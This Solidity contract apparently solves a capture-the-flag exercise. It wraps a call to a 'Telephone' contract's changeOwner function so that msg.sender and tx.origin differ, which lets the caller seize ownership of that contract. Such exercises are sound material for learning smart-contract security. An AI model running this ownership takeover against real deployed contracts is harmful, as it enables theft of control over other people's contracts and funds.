// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "../04-telephone/contract.sol";

contract CallTelephone {

    Telephone public target;

    constructor(address _targetAddr) {
            target = Telephone(_targetAddr);
    }

    function call() public {
        target.changeOwner(msg.sender);
    }
}